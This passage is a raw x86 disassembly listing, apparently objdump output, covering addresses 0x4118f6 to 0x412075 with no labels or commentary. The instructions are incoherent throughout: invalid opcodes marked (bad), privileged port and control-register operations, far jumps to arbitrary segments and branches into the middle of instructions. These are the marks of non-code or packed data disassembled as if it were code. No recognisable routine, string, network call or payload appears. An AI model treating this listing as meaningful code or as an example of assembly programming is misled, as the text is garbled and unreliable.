  4118f6:	retf   
  4118f7:	fdiv   DWORD PTR [ecx-0x60]
  4118fa:	lahf   
  4118fb:	out    dx,eax
  4118fc:	popa   
  4118fd:	push   0x10
  4118ff:	inc    ebx
  411900:	and    ebp,DWORD PTR [ebp-0x7d]
  411903:	hlt    
  411904:	adc    ecx,DWORD PTR [ecx]
  411906:	mov    WORD PTR [ebx],fs
  411908:	cmp    esp,eax
  41190a:	pop    eax
  41190b:	xchg   ecx,eax
  41190c:	or     al,0x4f
  41190e:	out    dx,eax
  41190f:	dec    esp
  411910:	jmp    0xdba1acea
  411915:	loopne 0x4118c6
  411917:	loopne 0x4118f9
  411919:	pop    esi
  41191a:	mov    bh,0xca
  41191c:	jo     0x411981
  41191e:	sbb    ah,BYTE PTR [ecx]
  411920:	outs   dx,BYTE PTR ds:[esi]
  411921:	fidiv  DWORD PTR [esi+0x3a76ca1e]
  411927:	mov    dh,0x29
  411929:	or     dh,BYTE PTR [edx+0x63e4734]
  41192f:	loop   0x4119a3
  411931:	dec    edi
  411932:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411933:	and    BYTE PTR [eax],dh
  411935:	jg     0x41193f
  411937:	out    dx,al
  411938:	popa   
  411939:	mov    eax,ds:0x70fd397b
  41193e:	std    
  41193f:	jo     0x4119c0
  411941:	call   0x3079:0x72019038
  411948:	test   DWORD PTR [edi-0x5f214481],esi
  41194e:	(bad)  
  41194f:	int    0x7b
  411951:	neg    DWORD PTR [ebp-0x624a3c3a]
  411957:	sbb    esp,ecx
  411959:	rcr    DWORD PTR [esi],1
  41195b:	pushf  
  41195c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41195d:	adc    BYTE PTR [ebp+0x4c1d65e],ch
  411963:	xchg   esi,eax
  411964:	add    eax,DWORD PTR [edx]
  411966:	add    BYTE PTR [ecx+0x7d],0x8
  41196a:	dec    eax
  41196b:	shl    DWORD PTR [ebx],1
  41196d:	(bad)  
  41196e:	jmp    0x411982
  411970:	push   ecx
  411971:	jb     0x4118f3
  411973:	clc    
  411974:	(bad)  
  411976:	pop    eax
  411977:	xchg   DWORD PTR [ecx],ecx
  411979:	xor    ch,BYTE PTR [edi-0x1f]
  41197c:	pop    esp
  41197d:	push   ebp
  41197e:	cmp    BYTE PTR [esi+0x8],ah
  411981:	mov    DWORD PTR [eax-0x5826855a],ebp
  411987:	mov    esi,0x2cdc9cdf
  41198c:	pop    ebp
  41198d:	or     cl,BYTE PTR [eax-0x1f63eb3f]
  411993:	ins    BYTE PTR es:[edi],dx
  411994:	add    eax,0x61b4aaa4
  411999:	dec    esp
  41199a:	mov    bl,al
  41199c:	mov    dl,0x8f
  41199e:	aad    0x4e
  4119a0:	test   eax,0xcdedd192
  4119a5:	jne    0x4119f2
  4119a7:	xor    BYTE PTR [edi+ebp*8-0x6f7c4318],0x88
  4119af:	stc    
  4119b0:	fild   QWORD PTR [esi]
  4119b2:	ins    BYTE PTR es:[edi],dx
  4119b3:	stos   BYTE PTR es:[edi],al
  4119b4:	cli    
  4119b5:	dec    eax
  4119b6:	hlt    
  4119b7:	bound  edi,QWORD PTR [edx+eiz*1]
  4119ba:	or     DWORD PTR [esi-0x623f3865],0x6a
  4119c1:	aad    0x40
  4119c3:	pushf  
  4119c4:	mov    ah,0x9c
  4119c6:	add    eax,0x727fcbe2
  4119cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119cc:	sub    eax,0xaad006fe
  4119d1:	leave  
  4119d2:	sub    BYTE PTR [edx-0xecd0036],bl
  4119d8:	div    BYTE PTR [edi-0x49]
  4119db:	pop    es
  4119dc:	xchg   ebp,eax
  4119dd:	push   ebp
  4119de:	push   es
  4119df:	xlat   BYTE PTR ds:[ebx]
  4119e0:	jl     0x41196c
  4119e2:	add    DWORD PTR [edi+edx*4-0x4c],eax
  4119e6:	push   eax
  4119e7:	outs   dx,DWORD PTR ds:[esi]
  4119e8:	popf   
  4119e9:	or     BYTE PTR [ecx-0x7f],dl
  4119ec:	or     al,0x7b
  4119ee:	mov    DWORD PTR [edi-0x1a],edi
  4119f1:	fwait
  4119f2:	leave  
  4119f3:	addr16 mov bh,0x2f
  4119f6:	jnp    0x411a09
  4119f8:	lods   al,BYTE PTR ds:[esi]
  4119f9:	xchg   ebx,eax
  4119fa:	not    DWORD PTR [eax+0x51]
  4119fd:	nop
  4119fe:	test   BYTE PTR [eax+0x48d7c5ca],cl
  411a04:	or     edx,DWORD PTR [ebx+0x15]
  411a07:	leave  
  411a08:	adc    edx,esi
  411a0a:	in     eax,dx
  411a0b:	(bad)  
  411a0c:	rcr    DWORD PTR [edx],1
  411a0e:	fisubr WORD PTR [edx-0x64]
  411a11:	push   0xffffffbe
  411a13:	cmp    eax,DWORD PTR [ecx+0x7ffad541]
  411a19:	stos   BYTE PTR es:[edi],al
  411a1a:	xchg   edx,eax
  411a1b:	mov    ecx,0x9f511109
  411a20:	inc    edi
  411a21:	rcl    DWORD PTR [ebx+0x747174a],cl
  411a27:	outs   dx,BYTE PTR ds:[esi]
  411a28:	inc    edi
  411a29:	popf   
  411a2a:	sub    edx,0xffffffd7
  411a2d:	add    BYTE PTR [esi+eax*2],ch
  411a30:	gs pushf 
  411a32:	mov    edi,ebx
  411a34:	cmp    ch,ch
  411a36:	add    al,0xa4
  411a39:	pop    es
  411a3a:	cmc    
  411a3b:	mov    edi,0xaaeaf44
  411a40:	test   BYTE PTR [ebp+0x7a29e55e],cl
  411a46:	or     al,0xc8
  411a48:	aaa    
  411a49:	iret   
  411a4a:	inc    ebx
  411a4b:	out    0x78,eax
  411a4d:	and    cl,BYTE PTR [ecx+edi*1]
  411a50:	lods   eax,DWORD PTR ds:[esi]
  411a51:	frstor [ecx]
  411a53:	mov    al,ds:0x4317a7a4
  411a58:	and    dh,bl
  411a5a:	repnz div BYTE PTR [esi]
  411a5d:	mov    ebx,0xbbad2db2
  411a62:	jb     0x411ab7
  411a64:	stos   DWORD PTR es:[edi],eax
  411a65:	hlt    
  411a66:	cmp    BYTE PTR [ebx+0x4c],0x26
  411a6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a6b:	inc    ecx
  411a6c:	bound  edi,QWORD PTR [eax+0x4d50907a]
  411a72:	hlt    
  411a73:	fstp   TBYTE PTR [ebp-0x40a36a14]
  411a79:	shr    bl,cl
  411a7b:	xchg   esi,eax
  411a7c:	jb     0x411a31
  411a7e:	or     dh,bl
  411a80:	into   
  411a81:	mov    edx,0x616c44a3
  411a86:	sub    DWORD PTR [eax-0x201941db],eax
  411a8c:	shl    BYTE PTR [edx+0x17],1
  411a8f:	sahf   
  411a90:	sbb    esi,DWORD PTR [eax-0xe]
  411a93:	pop    es
  411a94:	cmp    BYTE PTR [ebx+0x3c],dl
  411a97:	push   ebx
  411a98:	shr    eax,cl
  411a9a:	add    al,0x3e
  411a9c:	dec    ecx
  411a9d:	(bad)  
  411a9e:	xor    eax,0x8ae5c959
  411aa3:	sbb    bh,BYTE PTR [ebx]
  411aa5:	dec    edi
  411aa6:	pop    ecx
  411aa7:	js     0x411ab5
  411aa9:	mov    bh,0xd2
  411aab:	sub    eax,0xeeb9006d
  411ab0:	mov    edi,0x99380d4c
  411ab5:	aam    0x4f
  411ab7:	ds leave 
  411ab9:	xor    edx,ecx
  411abb:	sub    eax,esp
  411abd:	pop    ecx
  411abe:	dec    eax
  411abf:	(bad)  
  411ac1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ac2:	jle    0x411af9
  411ac4:	push   edx
  411ac5:	leave  
  411ac6:	mov    bl,0x1b
  411ac8:	leave  
  411ac9:	mov    edx,DWORD PTR [edi+0x2c024516]
  411acf:	sub    BYTE PTR [edx+0x1e],al
  411ad2:	mov    edi,0x32cdab08
  411ad7:	xchg   ebx,eax
  411ad9:	lods   eax,DWORD PTR ds:[esi]
  411ada:	push   esp
  411adb:	xchg   BYTE PTR [esi+ebp*1],dl
  411ade:	daa    
  411adf:	pushw  cs
  411ae1:	push   ecx
  411ae2:	xor    al,0xc3
  411ae4:	sub    edx,DWORD PTR [ebp+0x13]
  411ae7:	or     BYTE PTR [esi],bl
  411ae9:	int3   
  411aea:	mov    esp,edi
  411aec:	inc    ecx
  411aed:	addr16 mov bh,0x29
  411af0:	in     eax,dx
  411af1:	in     eax,0x1c
  411af3:	addr16 jne 0x411b22
  411af6:	outs   dx,DWORD PTR ds:[esi]
  411af7:	or     DWORD PTR [edx],ebx
  411af9:	pop    eax
  411afa:	pop    ds
  411afb:	ret    
  411afc:	mov    esi,0x7e968875
  411b01:	and    cl,BYTE PTR [edx+0x4a]
  411b04:	jmp    0xe544:0xe3a54cf8
  411b0b:	test   BYTE PTR [ebx+0x5c],dh
  411b0e:	push   0xffffff99
  411b10:	inc    ebx
  411b11:	cdq    
  411b12:	push   esp
  411b13:	inc    eax
  411b14:	lds    ebp,FWORD PTR [edx]
  411b16:	push   edx
  411b17:	cmp    dh,BYTE PTR [edx]
  411b19:	scas   eax,DWORD PTR es:[edi]
  411b1a:	xchg   ebx,eax
  411b1b:	mov    esi,0x172d4875
  411b20:	jp     0x411b86
  411b22:	loop   0x411b1f
  411b24:	retf   0x8cb4
  411b27:	jo     0x411ade
  411b29:	fmul   st(7),st
  411b2b:	jmp    0x411b1d
  411b2d:	hlt    
  411b2e:	mov    dl,BYTE PTR ds:0x2344b128
  411b34:	sbb    al,dh
  411b36:	or     eax,0xb89e7710
  411b3b:	sar    BYTE PTR [ecx+0x63169976],1
  411b41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b42:	push   es
  411b43:	or     BYTE PTR [ecx+eax*2-0x51],bl
  411b47:	cmp    cl,al
  411b49:	(bad)  
  411b4a:	mov    ebp,0x4c0a92b6
  411b4f:	jmp    0xf627:0x711c73cc
  411b56:	(bad)  
  411b57:	pop    ebx
  411b58:	arpl   sp,dx
  411b5a:	iret   
  411b5b:	imul   edx,DWORD PTR [esi],0x13
  411b5e:	neg    BYTE PTR [edi+esi*1+0x760feea4]
  411b65:	mov    ebp,ebx
  411b67:	pop    esi
  411b68:	clc    
  411b69:	adc    BYTE PTR [edi-0x44b0a9b2],bh
  411b6f:	add    edi,esp
  411b71:	adc    dl,al
  411b73:	lea    eax,[edi+0x20]
  411b76:	imul   ebp,DWORD PTR ds:0x8feeb8a1,0x73
  411b7d:	sbb    bh,BYTE PTR [ecx]
  411b7f:	jle    0x411b65
  411b81:	sub    eax,0x4972882d
  411b86:	cld    
  411b87:	adc    eax,0x3fd4d176
  411b8c:	dec    esi
  411b8d:	ret    
  411b8e:	test   eax,0x713d2891
  411b93:	ss cmp al,0x73
  411b96:	ret    0xec98
  411b99:	dec    ecx
  411b9a:	(bad)  
  411b9b:	jne    0x411b4f
  411b9d:	arpl   WORD PTR [ebx-0x3d],bx
  411ba0:	push   edx
  411ba1:	shr    DWORD PTR [ebx-0x74],cl
  411ba4:	xchg   edi,eax
  411ba5:	in     eax,dx
  411ba6:	inc    ebp
  411ba7:	mov    ebp,0x54bb9252
  411bac:	cmp    BYTE PTR [esi+0x35],dl
  411baf:	mov    cr3,esp
  411bb2:	sbb    al,0x88
  411bb4:	outs   dx,BYTE PTR ds:[esi]
  411bb5:	gs adc al,al
  411bb8:	loope  0x411bb5
  411bba:	ja     0x411bee
  411bbc:	daa    
  411bbd:	icebp  
  411bbe:	in     al,dx
  411bbf:	pop    ebp
  411bc0:	push   ebp
  411bc1:	loope  0x411b9c
  411bc3:	sbb    al,0xdd
  411bc5:	push   es
  411bc6:	cmp    ebx,edx
  411bc8:	cwde   
  411bc9:	loopne 0x411b78
  411bcb:	(bad)  
  411bcd:	addr16 or eax,0x344fc470
  411bd3:	cmp    al,0x14
  411bd5:	cwde   
  411bd6:	push   ebp
  411bd7:	cmp    BYTE PTR [esp+esi*2+0x1a],al
  411bdb:	adc    eax,0xbf4c7ce4
  411be0:	xchg   edx,eax
  411be1:	sbb    eax,0xbb01db9d
  411be6:	(bad)  
  411be7:	std    
  411be8:	in     eax,0x69
  411bea:	sbb    ecx,DWORD PTR [edx-0x5bed1dd7]
  411bf0:	sbb    ecx,DWORD PTR [eax+edi*4]
  411bf3:	test   BYTE PTR [ebx+0x11],0xb7
  411bf7:	jo     0x411ba1
  411bf9:	nop
  411bfa:	push   esp
  411bfb:	pop    esp
  411bfc:	bound  ebx,QWORD PTR [ebp+0x79cd2098]
  411c02:	fwait
  411c03:	push   ebx
  411c04:	dec    esi
  411c05:	dec    ebp
  411c06:	mov    esp,0xe63f7a1c
  411c0b:	lock sub ah,BYTE PTR [eax+ebp*8-0x68ba7aa2]
  411c13:	fistp  WORD PTR [ecx]
  411c15:	mov    ah,al
  411c17:	push   edx
  411c18:	sbb    eax,0x48899e40
  411c1d:	outs   dx,BYTE PTR ds:[esi]
  411c1e:	sbb    dh,BYTE PTR [edx]
  411c20:	lods   eax,DWORD PTR ds:[esi]
  411c21:	lods   al,BYTE PTR ds:[esi]
  411c22:	test   BYTE PTR [ebp+0x58],al
  411c25:	pop    es
  411c26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c27:	pop    esi
  411c28:	js     0x411bb8
  411c2a:	cmp    BYTE PTR [ebx-0x54],0x5c
  411c2e:	xchg   edi,eax
  411c2f:	in     eax,dx
  411c30:	adc    DWORD PTR [esi+eiz*1-0x3c],0xbd991fff
  411c38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c39:	stos   DWORD PTR es:[edi],eax
  411c3a:	in     al,0x85
  411c3c:	xor    al,0x20
  411c3e:	ret    
  411c3f:	push   0x7c
  411c41:	stos   DWORD PTR es:[edi],eax
  411c42:	arpl   WORD PTR [esi+esi*1],bp
  411c45:	ds call 0xc39a0a39
  411c4b:	add    DWORD PTR [edx],edx
  411c4d:	out    dx,eax
  411c4e:	lock push eax
  411c50:	adc    al,0x26
  411c52:	mov    al,ds:0x729b7771
  411c57:	cmp    eax,0x50e94d1c
  411c5c:	or     eax,0x4e53d7a4
  411c61:	test   eax,0x381c5529
  411c66:	pop    ecx
  411c67:	mov    ds:0x1e902b4,al
  411c6c:	(bad)  
  411c6d:	js     0x411ce2
  411c6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c70:	or     edx,DWORD PTR [esi]
  411c72:	nop
  411c73:	call   0xdebdff9d
  411c78:	xor    al,dh
  411c7a:	into   
  411c7b:	mov    bh,0x8f
  411c7d:	jbe    0x411c4f
  411c7f:	imul   DWORD PTR [ebx-0x54]
  411c82:	sub    esi,edx
  411c84:	les    ecx,FWORD PTR [eax+0x826b3cf]
  411c8a:	daa    
  411c8b:	icebp  
  411c8c:	fistp  QWORD PTR [edi]
  411c8e:	mov    ch,0x3c
  411c90:	dec    eax
  411c91:	(bad)  
  411c92:	dec    ecx
  411c93:	xor    DWORD PTR [ebp+0x5],ebx
  411c96:	jbe    0x411c35
  411c98:	aas    
  411c99:	add    ebx,esi
  411c9b:	fs in  al,dx
  411c9d:	sub    BYTE PTR [ebx+edi*1-0x5b],0x86
  411ca2:	jecxz  0x411c2d
  411ca4:	popa   
  411ca5:	adc    ebp,edi
  411ca7:	adc    al,0x20
  411ca9:	mov    BYTE PTR [edi],bh
  411cab:	call   0x3d00d09f
  411cb0:	hlt    
  411cb1:	nop
  411cb2:	out    dx,eax
  411cb3:	push   ecx
  411cb4:	jecxz  0x411c89
  411cb6:	mov    dl,0xfc
  411cb8:	dec    edi
  411cb9:	dec    ebx
  411cba:	or     al,0x19
  411cbc:	loop   0x411cbc
  411cbe:	fbstp  TBYTE PTR [esi]
  411cc0:	jbe    0x411ccd
  411cc2:	dec    ecx
  411cc3:	cmp    al,0x6d
  411cc5:	mov    esi,0x48127f59
  411cca:	or     DWORD PTR [ebp-0x46],ecx
  411ccd:	add    ah,bh
  411ccf:	fld    QWORD PTR ds:0xe7323d9e
  411cd5:	xchg   esi,ecx
  411cd7:	mov    eax,ds:0xaad7371c
  411cdc:	test   BYTE PTR [esi+ecx*4+0x4b0d6244],0xd
  411ce4:	or     eax,0x734e4e5
  411ce9:	das    
  411cea:	xchg   DWORD PTR [edx+0x74ecee04],edx
  411cf0:	iret   
  411cf1:	(bad)  
  411cf2:	xchg   ebx,eax
  411cf3:	and    DWORD PTR [eax-0x77777e99],eax
  411cf9:	or     eax,DWORD PTR [ecx]
  411cfb:	cli    
  411cfc:	pop    DWORD PTR [ecx+0x175144b4]
  411d02:	lock fstp QWORD PTR [ebp-0x65]
  411d06:	int3   
  411d07:	push   cs
  411d08:	std    
  411d09:	scas   eax,DWORD PTR es:[edi]
  411d0a:	dec    edi
  411d0b:	stos   DWORD PTR es:[edi],eax
  411d0c:	xor    DWORD PTR cs:[edx],edi
  411d0f:	lds    esp,FWORD PTR [ebp+0x18e9eb84]
  411d15:	aaa    
  411d16:	and    eax,0x8ef36bc7
  411d1b:	push   es
  411d1c:	adc    ebp,DWORD PTR [eax]
  411d1e:	jmp    0xda79e42a
  411d23:	shl    edi,0xad
  411d26:	pop    ebx
  411d27:	jo     0x411caa
  411d29:	jge    0x411d51
  411d2b:	sub    ebp,DWORD PTR [eax-0x32d294a7]
  411d31:	in     al,dx
  411d32:	mov    DWORD PTR [edi-0x6ff8f6de],ebp
  411d38:	or     al,0x41
  411d3a:	imul   edx,DWORD PTR [esi],0xffffff85
  411d3d:	sub    eax,0x3e9882d1
  411d42:	and    ch,BYTE PTR [esi+0x79058e36]
  411d48:	ins    DWORD PTR es:[edi],dx
  411d49:	leave  
  411d4a:	iret   
  411d4b:	jmp    0x411d66
  411d4d:	bound  esi,QWORD PTR [eax]
  411d4f:	jb     0x411d0c
  411d51:	mov    al,ds:0xc165a22
  411d56:	push   eax
  411d57:	mov    edi,0xc297ac1d
  411d5c:	mov    eax,0x78989179
  411d61:	pop    ds
  411d62:	cmp    BYTE PTR [edi-0x37942ebf],bl
  411d68:	add    esi,esp
  411d6a:	xchg   edi,eax
  411d6b:	or     BYTE PTR [edi-0x7d],ch
  411d6e:	mov    ecx,0x19388f13
  411d73:	repz and ebx,edi
  411d76:	fbld   TBYTE PTR [ebx+0x3b]
  411d79:	stos   DWORD PTR es:[edi],eax
  411d7a:	adc    esp,DWORD PTR [edx-0xd]
  411d7d:	jmp    0x411db5
  411d7f:	sub    eax,0xbaa07632
  411d84:	inc    eax
  411d85:	xchg   edi,eax
  411d86:	ja     0x411d82
  411d88:	clc    
  411d89:	or     ah,BYTE PTR [esi]
  411d8b:	frndint 
  411d8d:	aaa    
  411d8e:	mul    bh
  411d90:	idiv   BYTE PTR [esp+ebp*4-0x1d54fbb5]
  411d97:	loop   0x411d29
  411d99:	or     edx,DWORD PTR [ebp-0x6e]
  411d9c:	xchg   edx,eax
  411d9d:	(bad)  [ecx+0x6079d4bd]
  411da3:	add    al,0xcc
  411da5:	call   0xf0738389
  411daa:	push   edi
  411dab:	pop    esp
  411dac:	jno    0x411de6
  411dae:	add    cl,dh
  411db0:	cmp    al,0x4d
  411db2:	push   edx
  411db3:	test   al,0xdd
  411db5:	push   ds
  411db6:	repz push edx
  411db8:	xor    eax,0xfb1a87b
  411dbd:	int    0x37
  411dbf:	in     eax,dx
  411dc0:	mov    dh,0x58
  411dc2:	aaa    
  411dc3:	ret    
  411dc4:	test   al,0x84
  411dc6:	repnz pop ds
  411dc8:	or     ch,BYTE PTR [edi-0x69]
  411dcb:	cmp    bh,BYTE PTR [ebx-0x3f]
  411dce:	or     DWORD PTR [esi+0x2da723de],esi
  411dd4:	out    dx,al
  411dd5:	dec    ebp
  411dd6:	inc    eax
  411dd7:	mov    ecx,0xb3082e5f
  411ddc:	data16 mov dl,BYTE PTR ss:[bp+di-0x3aa5]
  411de3:	fcmovbe st,st(2)
  411de5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411de6:	dec    ebx
  411de7:	fild   WORD PTR [ecx+0x32532763]
  411ded:	cmp    cl,cl
  411def:	stc    
  411df0:	neg    BYTE PTR [eax-0x4a]
  411df3:	xchg   esi,eax
  411df4:	add    al,0xf
  411df6:	test   al,0xe9
  411df8:	push   0x716b07cc
  411dfd:	in     eax,dx
  411dfe:	fild   WORD PTR [esi*2+0x2e20c8e4]
  411e05:	jge    0x411df6
  411e07:	pop    esp
  411e08:	sub    eax,0xe55adad7
  411e0d:	daa    
  411e0e:	lahf   
  411e0f:	and    ch,BYTE PTR [ecx]
  411e11:	mov    WORD PTR [edx+0x55bbd65d],ss
  411e17:	test   eax,0x3cb14287
  411e1c:	sbb    al,0x95
  411e1e:	aam    0x4e
  411e20:	or     al,0xc8
  411e22:	pop    edi
  411e24:	(bad)  
  411e25:	mov    cl,0xb1
  411e27:	mov    eax,0xc71b5bf5
  411e2c:	outs   dx,BYTE PTR ds:[esi]
  411e2d:	cwde   
  411e2e:	stos   DWORD PTR es:[edi],eax
  411e2f:	sbb    bh,BYTE PTR ds:0xc6b18ebc
  411e35:	cmp    BYTE PTR [edi+0x2dd204ad],dh
  411e3b:	pop    ds
  411e3c:	(bad)  
  411e3d:	jmp    0x5a0f:0x6815f0b3
  411e44:	sbb    al,0xf2
  411e46:	pop    esi
  411e47:	push   ss
  411e48:	in     al,0xab
  411e4a:	call   0xdd496b10
  411e4f:	cdq    
  411e50:	pop    esp
  411e51:	shl    DWORD PTR [edi+eax*8-0x1e],1
  411e55:	push   es
  411e56:	push   ebp
  411e57:	push   cs
  411e58:	add    BYTE PTR [edi+0xc],ah
  411e5b:	mov    cl,0xfa
  411e5d:	ror    dl,0x1a
  411e60:	stc    
  411e61:	or     esi,edi
  411e63:	mov    edx,gs
  411e65:	stc    
  411e66:	cld    
  411e67:	cmc    
  411e68:	jmp    0x411ecc
  411e6a:	das    
  411e6b:	and    ecx,DWORD PTR [esi-0x1d]
  411e6e:	jp     0x411e2e
  411e70:	cld    
  411e71:	cdq    
  411e72:	repnz push edi
  411e74:	not    BYTE PTR [esi+0x4a23e24d]
  411e7a:	inc    DWORD PTR ds:0x9d2d0cdc
  411e80:	push   ebx
  411e81:	jmp    0x411e8c
  411e83:	inc    eax
  411e84:	lds    ebx,FWORD PTR [ebx+edx*8+0x44]
  411e88:	call   0x17b0:0xd1756f3b
  411e8f:	mov    al,ds:0xb7ad2039
  411e94:	jmp    0x754e:0xfa270049
  411e9b:	add    dh,BYTE PTR [eax+0x2f]
  411e9e:	(bad)  [esp+ebp*8]
  411ea1:	mov    ds:0x1fa40f94,al
  411ea6:	sbb    eax,0x25c73643
  411eab:	ret    0xf58b
  411eae:	jne    0x411f2d
  411eb0:	aas    
  411eb1:	aaa    
  411eb2:	add    DWORD PTR [ebx+0x27],ebp
  411eb5:	cmp    bh,0xf7
  411eb8:	lods   eax,DWORD PTR ds:[esi]
  411eb9:	inc    edi
  411eba:	std    
  411ebb:	hlt    
  411ebc:	adc    edx,ecx
  411ebe:	fcomp  DWORD PTR [esp+ebp*2]
  411ec1:	lods   al,BYTE PTR ds:[esi]
  411ec2:	push   ss
  411ec3:	rol    DWORD PTR [ebp+0x65],cl
  411ec6:	cld    
  411ec7:	jge    0x411e88
  411ec9:	and    eax,0xc95666cd
  411ece:	or     BYTE PTR [ebp+0x32],bl
  411ed1:	adc    DWORD PTR [ecx+0x9],0xffffffd8
  411ed5:	daa    
  411ed6:	fidiv  WORD PTR [eax-0x3]
  411ed9:	xor    edx,eax
  411edb:	fs xchg ebp,eax
  411edd:	xchg   edx,eax
  411ede:	enter  0x4ef1,0x4b
  411ee2:	or     esi,DWORD PTR [edx-0x6ba3ea84]
  411ee8:	mov    ecx,0xb0112e6d
  411eed:	into   
  411eee:	gs stc 
  411ef0:	pushf  
  411ef1:	mov    ah,0x6a
  411ef3:	add    eax,0x882f09
  411ef8:	int3   
  411ef9:	icebp  
  411efa:	xchg   ecx,eax
  411efb:	ja     0x411e98
  411efd:	cli    
  411efe:	mov    dl,bl
  411f00:	retf   0x4511
  411f03:	das    
  411f04:	sar    BYTE PTR [eax+ecx*1],1
  411f07:	dec    esp
  411f08:	into   
  411f09:	xchg   ebx,eax
  411f0a:	or     ch,dl
  411f0c:	mov    ds,WORD PTR [edi+0x3d]
  411f0f:	mov    dl,BYTE PTR [edx-0x1c]
  411f12:	out    dx,al
  411f13:	enter  0xea1a,0xd8
  411f17:	jnp    0x411e9b
  411f19:	add    BYTE PTR [edi+0x2737af1c],ah
  411f1f:	aas    
  411f20:	sub    BYTE PTR [edi+0x2f],ah
  411f23:	fdiv   QWORD PTR [edx+eiz*2+0x4f08f908]
  411f2a:	or     DWORD PTR [esi-0x33],eax
  411f2d:	sbb    ecx,DWORD PTR [eax+0x75]
  411f30:	(bad)  
  411f31:	or     edi,eax
  411f33:	xor    DWORD PTR [esi],esi
  411f35:	into   
  411f36:	or     DWORD PTR [ecx-0x37],eax
  411f39:	cli    
  411f3a:	inc    edx
  411f3b:	aad    0x80
  411f3d:	push   edx
  411f3e:	cmp    al,0xb5
  411f40:	and    eax,0x46d5ea0e
  411f45:	test   BYTE PTR [ebx],cl
  411f47:	cdq    
  411f48:	dec    ecx
  411f49:	dec    ebp
  411f4a:	xlat   BYTE PTR ds:[ebx]
  411f4b:	pop    edi
  411f4c:	xchg   edx,eax
  411f4d:	in     al,dx
  411f4e:	mov    dh,0x72
  411f50:	xchg   ebp,eax
  411f51:	add    BYTE PTR [ecx-0xe],ah
  411f54:	or     BYTE PTR [esi+0x31],0x8f
  411f58:	fisttp DWORD PTR [ebx-0x418be7db]
  411f5e:	cmp    ch,ch
  411f60:	push   dx
  411f62:	dec    ebp
  411f63:	adc    ecx,ebp
  411f65:	int    0x53
  411f67:	xor    al,0xdb
  411f69:	mov    cl,cl
  411f6b:	mov    dh,0xdb
  411f6d:	(bad)  
  411f6e:	jb     0x411f6d
  411f70:	add    eax,DWORD PTR [eax+eiz*4]
  411f73:	call   0x4820:0xc3701692
  411f7a:	(bad)  
  411f7b:	pop    eax
  411f7c:	in     eax,0x98
  411f7e:	int3   
  411f7f:	enter  0x9cdb,0xab
  411f83:	fld    TBYTE PTR [edx+0x37164ded]
  411f89:	jae    0x411f39
  411f8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f8c:	push   esi
  411f8d:	das    
  411f8e:	mov    esp,0xb7bd92d0
  411f93:	sar    ah,1
  411f95:	push   cs
  411f96:	adc    BYTE PTR [ebp+0x6e3fa56b],ah
  411f9c:	xchg   edx,eax
  411f9d:	inc    ecx
  411f9e:	pop    ecx
  411f9f:	(bad)  
  411fa0:	mov    bl,0x67
  411fa2:	inc    esp
  411fa3:	or     al,BYTE PTR [ecx]
  411fa5:	(bad)  
  411fa6:	push   ds
  411fa7:	aaa    
  411fa8:	sbb    al,0x68
  411faa:	jmp    0x25bf5510
  411faf:	mov    al,0xb6
  411fb1:	imul   esp,esp,0x497771f1
  411fb7:	add    eax,0x9e2aec47
  411fbc:	(bad)  
  411fbd:	mov    esp,0x94921a66
  411fc2:	sub    eax,0x7a79bd5b
  411fc7:	push   0x56f196fd
  411fcc:	mov    BYTE PTR [ecx],dh
  411fce:	call   0xd6ff:0x9f7b60ae
  411fd5:	mov    al,0xf9
  411fd7:	(bad)  
  411fd8:	ficom  WORD PTR [eax]
  411fda:	fiadd  DWORD PTR [ebx+0x24]
  411fdd:	xchg   edi,eax
  411fde:	aas    
  411fdf:	scas   al,BYTE PTR es:[edi]
  411fe0:	sti    
  411fe1:	xlat   BYTE PTR ds:[ebx]
  411fe2:	loop   0x411f8a
  411fe4:	push   eax
  411fe5:	daa    
  411fe6:	popa   
  411fe7:	xor    eax,DWORD PTR [eax-0x4ab54db5]
  411fed:	push   ss
  411fee:	ja     0x411fb6
  411ff0:	cmp    al,0xba
  411ff2:	push   DWORD PTR [ebx]
  411ff4:	stos   BYTE PTR es:[edi],al
  411ff5:	mov    ebp,0xb82135b4
  411ffa:	adc    eax,0x3413c79e
  411fff:	popa   
  412000:	pusha  
  412001:	(bad)  
  412002:	out    dx,al
  412003:	dec    ebx
  412004:	or     al,0xf6
  412006:	pop    ebp
  412007:	(bad)  
  412008:	fwait
  412009:	gs inc edi
  41200b:	or     esp,ebp
  41200d:	adc    bh,dl
  41200f:	out    0x92,eax
  412011:	aad    0x10
  412013:	rcr    DWORD PTR [ecx],0xf6
  412016:	xchg   ecx,eax
  412017:	cmp    al,0xec
  412019:	(bad)  
  41201a:	hlt    
  41201b:	scas   eax,DWORD PTR es:[edi]
  41201c:	mov    bh,0xb4
  41201e:	mov    dl,0xbf
  412020:	push   edx
  412021:	and    DWORD PTR [ecx-0x45],esi
  412024:	scas   al,BYTE PTR es:[edi]
  412025:	rol    BYTE PTR [edx-0x57a728ad],cl
  41202b:	mov    esp,ecx
  41202d:	fistp  QWORD PTR [ebp-0x2cdd3b35]
  412033:	mov    bh,0x6a
  412035:	mov    DWORD PTR [edi],edx
  412037:	mov    dl,0x46
  412039:	test   DWORD PTR [eax+esi*8],esp
  41203c:	popa   
  41203d:	daa    
  41203e:	repz and ch,BYTE PTR es:0xa91b2479
  412046:	out    0xab,eax
  412048:	jno    0x4120ab
  41204a:	pop    ebp
  41204b:	mov    esi,0xe12cff1e
  412050:	pop    ss
  412051:	loop   0x41208f
  412053:	mov    ch,0x81
  412056:	cdq    
  412057:	jl     0x411fdf
  412059:	and    DWORD PTR [esi],0xffffffc6
  41205c:	cmp    al,0x52
  41205e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41205f:	das    
  412060:	mov    ch,dh
  412062:	daa    
  412063:	ror    BYTE PTR [ecx+ebp*4],cl
  412066:	or     DWORD PTR [edx+0x19ee0ba5],edi
  41206c:	sub    al,0x20
  41206e:	jmp    0xf90e:0x50737076
  412075:	jmp    0x22f9:0x554f7155
